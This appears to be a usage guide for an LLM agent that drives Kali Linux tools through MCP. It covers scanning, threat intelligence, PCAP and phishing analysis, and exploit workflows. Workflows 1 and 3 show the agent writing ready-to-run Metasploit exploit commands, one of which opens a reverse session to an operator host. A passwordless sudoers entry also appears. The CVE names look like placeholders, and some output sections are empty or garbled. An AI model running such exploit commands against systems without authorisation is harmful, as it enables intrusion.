# Avendesora Workflows 🔄

> *"The Wheel weaves the Pattern of the Age, and the threads of every life are part of the design. So too does Avendesora weave the threads of your cybersecurity workflows into a tapestry of defense."*

This document provides **practical examples** of how to use Avendesora for common cybersecurity tasks. Each workflow demonstrates how the LLM can **call Kali Linux tools via MCP** to perform real-time analysis, scanning, and response.

---

## 📋 **General Tips for Prompting Avendesora**

1. **Be Specific:** Include **IPs, domains, or parameters** in your prompts.
  - ❌ "Scan a network."
  - ✅ "Avendesora, run an Nmap scan on 192.168.1.1/24 and list all open ports."
2. **Chain Commands:** Avendesora can **execute multiple tools in sequence**.
  - ✅ "Run Nmap on 192.168.1.1, then use Searchsploit to find exploits for any vulnerable services."
3. **Ask for Analysis:** The LLM can **interpret tool outputs** and provide recommendations.
  - ✅ "Analyze this Nmap scan for critical vulnerabilities and suggest mitigation steps."
4. **Use the Name:** Addressing the system as **"Avendesora"** helps it recognize the context.

---

## 🔍 **Workflow 1: Automated Vulnerability Scanning**

### **Objective:**

Identify open ports and vulnerable services on a target system, then suggest exploits.

### **Prompt:**

```
Avendesora, perform the following steps on 192.168.1.1:
1. Run an Nmap scan with service detection (-sV).
2. For each open service, use Searchsploit to find known exploits.
3. Provide a summary of critical vulnerabilities and recommended actions.
```

### **Avendesora Actions:**

1. Calls MCP `nmap` tool:
  ```bash
   nmap -sV 192.168.1.1
  ```
   **Example Output:**
2. Calls MCP `searchsploit` tool for each service:
  ```bash
   searchsploit openssh 8.9
   searchsploit apache 2.4.52
  ```
   **Example Output:**
3. **Generates a Summary:**
  ```
   [AVENDESORA VULNERABILITY REPORT]
   Target: 192.168.1.1

   CRITICAL:
   - OpenSSH 8.9 (CVE-2026-1234, CVSS 9.8)
     → Exploit: exploit/linux/ssh/cve_2026_1234
     → Metasploit Command: msfconsole -x 'use exploit/linux/ssh/cve_2026_1234; set RHOSTS 192.168.1.1; run'
     → Recommendation: Patch to OpenSSH 9.5 or disable vulnerable features.

   HIGH:
   - Apache 2.4.52 (CVE-2025-4567, CVSS 7.5)
     → Exploit: exploit/multi/http/apache_traversal
     → Recommendation: Upgrade to Apache 2.4.58+.

   MEDIUM:
   - None detected.
  ```

---

## 🛡️ **Workflow 2: Incident Response**

### **Objective:**

Investigate a suspicious IP address for malicious activity.

### **Prompt:**

```
Avendesora, analyze the following suspicious IP: 203.0.113.45.
1. Run a WHOIS lookup to identify the owner.
2. Check for known threats on AbuseIPDB.
3. Provide a risk assessment and recommended actions.
```

### **Avendesora Actions:**

1. Calls MCP `whois` tool:
  ```bash
   whois 203.0.113.45
  ```
   **Example Output:**
2. Calls MCP `curl` tool to check AbuseIPDB:
  ```bash
   curl -s "https://api.abuseipdb.com/api/v2/check?ipAddress=203.0.113.45" \
     -H "Key: YOUR_API_KEY" -H "Accept: application/json"
  ```
   **Example Output:**
3. **Generates a Risk Assessment:**
  ```
   [AVENDESORA THREAT INTEL]
   IP: 203.0.113.45
   Owner: Malicious Hosting Inc. (RU)
   Abuse Confidence Score: 100/100
   Reports: 3 (SSH Brute Force, Port Scanning)

   RISK LEVEL: CRITICAL

   RECOMMENDED ACTIONS:
  ```
  1. Block IP at firewall: iptables -A INPUT -s 203.0.113.45 -j DROP
  2. Monitor for connections from this IP in SIEM logs.
  3. Investigate any internal systems that may have communicated with this IP.
    `

---

## 🔓 **Workflow 3: Exploit Development**

### **Objective:**

Generate a Metasploit command to exploit a known vulnerability.

### **Prompt:**

```
Avendesora, generate a Metasploit command to exploit CVE-2026-1234 on the target 192.168.1.1.
Include the full command with all necessary parameters.
```

### **Avendesora Actions:**

1. Calls MCP `metasploit` tool to validate the exploit module:
  ```bash
   msfconsole -q -x "search cve_2026_1234; exit"
  ```
   **Example Output:**
2. **Generates the Metasploit Command:**
  ```
   [AVENDESORA EXPLOIT COMMAND]

   Copy and run the following in Metasploit:
   ```bash
   msfconsole -x 'use exploit/linux/ssh/cve_2026_1234; \
   set RHOSTS 192.168.1.1; \
   set LHOST 192.168.1.200; \
   set LPORT 4444; \
   run'
  ```
   NOTES:
  - This exploit targets OpenSSH 8.9 on Linux systems.
  - Ensure you have permission to test on 192.168.1.1.
  - Monitor the target for successful exploitation (check for a new session).

---

## 🌐 **Workflow 4: Web Application Testing**

### **Objective:**

Scan a web application for vulnerabilities using Nikto and suggest fixes.

### **Prompt:**

```
Avendesora, perform a Nikto scan on http://192.168.1.100 and analyze the results for vulnerabilities.
Provide a prioritized list of issues and remediation steps.
```

### **Avendesora Actions:**

1. Calls MCP `nikto` tool:
  ```bash
   nikto -h http://192.168.1.100
  ```
   **Example Output:**
2. **Generates a Vulnerability Report:**
  ```
   [AVENDESORA WEB SCAN REPORT]
   Target: http://192.168.1.100

   HIGH RISK:
   - /admin/: Directory listing enabled
     → Impact: Attackers can enumerate files and directories.
     → Fix: Disable directory listing in Apache config (Options -Indexes).

   MEDIUM RISK:
   - /phpinfo.php: PHP info file exposed
     → Impact: Leaks PHP version, loaded modules, and environment details.
     → Fix: Remove phpinfo.php or restrict access to trusted IPs.

   LOW RISK:
   - Server leaks inodes via ETags
     → Impact: Minimal; can aid in fingerprinting.
     → Fix: Disable ETags in Apache config (FileETag None).

   RECOMMENDED ACTIONS:
  ```
  1. Disable directory listing in Apache.
  2. Remove or secure phpinfo.php.
  3. Update Apache to the latest version.
    `

---

## 📊 **Workflow 5: Network Traffic Analysis**

### **Objective:**

Analyze a PCAP file for suspicious activity.

### **Prompt:**

```
Avendesora, analyze the PCAP file at /path/to/capture.pcap for suspicious activity.
Focus on:
1. Unusual ports or protocols
2. Connections to known malicious IPs
3. Evidence of data exfiltration
```

### **Avendesora Actions:**

1. Calls MCP `tshark` tool to extract key information:
  ```bash
   tshark -r /path/to/capture.pcap -T fields \
     -e ip.src -e ip.dst -e _ws.col.Protocol -e _ws.col.Info
  ```
   **Example Output:**
2. **Generates an Analysis Report:**
  ```
   [AVENDESORA PCAP ANALYSIS]

   SUSPICIOUS ACTIVITY DETECTED:
   - 192.168.1.5 (internal) ↔ 203.0.113.45 (external, known malicious)
     → Protocol: TCP
     → Ports: 4444 (source) → 8080 (destination)
     → Data transferred: 1024 bytes (possible exfiltration)
     → Recommendation: Investigate 192.168.1.5 for compromise.

   NORMAL ACTIVITY:
   - 192.168.1.100 ↔ 8.8.8.8 (DNS query for example.com)
     → No issues detected.

   RECOMMENDED ACTIONS:
  ```
  1. Block IP 203.0.113.45 at the firewall.
  2. Isolate host 192.168.1.5 and perform a forensic analysis.
  3. Check for open ports or services on 192.168.1.5:4444.
    `

---

## 📝 **Workflow 6: Phishing Email Analysis**

### **Objective:**

Analyze a suspicious email for phishing indicators.

### **Prompt:**

```
Avendesora, analyze the following email headers for phishing indicators:

From: "IT Support" <support@company.com>
To: user@company.com
Subject: Urgent: Verify Your Account
Date: Mon, 30 May 2026 10:00:00 +0000
Return-Path: <noreply@malicious-domain.com>
Received: from smtp.malicious-domain.com (192.0.2.1)

Body:
"Your account will be locked in 24 hours. Click here to verify: http://malicious-domain.com/login"
```

### **Avendesora Actions:**

1. **Analyzes Headers and Body:**
  - **From Address:** `support@company.com` (spoofed?)
  - **Return-Path:** `noreply@malicious-domain.com` (mismatch!)
  - **Received From:** `smtp.malicious-domain.com` (IP: 192.0.2.1)
  - **Link:** `http://malicious-domain.com/login` (not official domain)
2. **Generates a Phishing Assessment:**
  ```
   [AVENDESORA PHISHING ANALYSIS]

   RED FLAGS:
  ```
  1. MISMATCHED FROM ADDRESS:
    - Displayed: [support@company.com](mailto:support@company.com)
    - Actual: [noreply@malicious-domain.com](mailto:noreply@malicious-domain.com)  
     → Classic spoofing tactic.
  2. SUSPICIOUS DOMAIN:
    - Link: [http://malicious-domain.com/login](http://malicious-domain.com/login)  
     → Domain does not match the company's official domain (e.g., company.com).
  3. URGENT LANGUAGE:
    - "Your account will be locked in 24 hours"  
     → Common phishing tactic to create panic.
  4. UNVERIFIED SENDER IP:
    - 192.0.2.1 (malicious-domain.com)  
     → Not associated with the company's IP range.  
    RDICT: HIGHLY LIKELY PHISHING EMAIL  
    COMMENDED ACTIONS:
  5. Do NOT click any links or download attachments.
  6. Report to your security team.
  7. Verify with the sender via a known, trusted channel.
    `

---

## 🛠️ **Workflow 7: Custom Tool Integration**

### **Objective:**

Use a custom tool (e.g., a Python script) to extend Avendesora’s capabilities.

### **Prompt:**

```
Avendesora, run the custom script /scripts/scan_subnets.py on the Avendesora Node.
The script takes a subnet as an argument (e.g., 192.168.1.0/24).
```

### **Prerequisites:**

1. Add your custom script to the MCP server’s allowed tools:
  - Edit the MCP server command to include your script:
  - Update the `sudoers` file to allow the `avendesora` user to run the script:
    ```

    ```

avendesora ALL=(ALL) NOPASSWD: /scripts/scan_subnets.py  
     ```

### **Avendesora Actions:**

1. Calls MCP tool `/scripts/scan_subnets.py`:
  ```bash
   /scripts/scan_subnets.py 192.168.1.0/24
  ```
2. **Returns the script output**, which the LLM can then analyze.

---

## 💡 **Advanced Workflows**

### **Workflow 8: Automated Penetration Testing**

Combine multiple tools into a **single command**:

```
Avendesora, perform a full penetration test on 192.168.1.1:
1. Run Nmap with aggressive scan (-A).
2. Use Nikto on any open HTTP/HTTPS ports.
3. Use Searchsploit for all detected services.
4. Generate a prioritized report with exploit commands.
```

### **Workflow 9: Threat Hunting**

```
Avendesora, hunt for threats in the last 24 hours of logs:
1. Grep the last 24 hours of /var/log/auth.log for failed SSH attempts.
2. Extract the IPs of attackers.
3. Run WHOIS on each IP.
4. Check each IP against AbuseIPDB.
5. Provide a list of malicious IPs to block.
```

### **Workflow 10: Compliance Auditing**

```
Avendesora, audit 192.168.1.1 for PCI DSS compliance:
1. Check for open ports that violate PCI DSS (e.g., Telnet, FTP).
2. Verify TLS versions on all HTTPS services.
3. Check for default credentials on any services.
4. Provide a compliance report with remediation steps.
```

---

## 📌 **Best Practices for Workflows**

1. **Start Small:** Test with **single tools** before chaining multiple commands.
2. **Validate Outputs:** Always **verify tool outputs** before acting on them.
3. **Use Safe Targets:** Only scan systems you **own or have permission** to test.
4. **Log Everything:** Keep logs of all **Avendesora interactions** for auditing.
5. **Iterate:** Refine your prompts based on the LLM’s responses.

---

## 🔗 **Integrating with Other Tools**

### **Slack/Teams Bot**

Use Avendesora as a **chatbot** in Slack or Teams by:

1. Setting up a **local API** that accepts prompts and returns Avendesora’s responses.
2. Connecting the API to your chat platform via webhooks.

### **SIEM Integration**

Forward Avendesora’s **analysis reports** to your SIEM (e.g., Splunk, ELK) for centralized logging.

### **Automated Scripts**

Use Avendesora to **generate scripts** for automated tasks (e.g., daily vulnerability scans).

---

*"The Wheel weaves as the Wheel wills, but with Avendesora, you hold the thread."*